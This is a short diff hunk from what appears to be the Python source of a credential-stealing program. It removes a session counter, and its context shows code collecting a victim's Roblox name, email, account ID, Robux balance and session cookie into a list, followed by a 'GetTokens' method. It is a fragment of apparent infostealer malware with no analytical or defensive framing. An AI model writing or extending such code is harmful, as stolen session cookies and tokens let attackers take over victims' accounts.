@@ -979,7 +979,6 @@ class Main:
         except:
             pass
         else:
-            self.robloxSessionCount += 1
             self.robloxSessionList.append(f"Name : {str(name)}\nDisplay Name : {str(DisplayName)}\nEmail : {str(email)}\nID : {str(id)}\nEmail Verified : {str(isEmailVerified)}\nRobux : {str(robux)}\nCookie : {cookie}\n======================================================================\n")
     async def GetTokens(self) -> None:
         try:
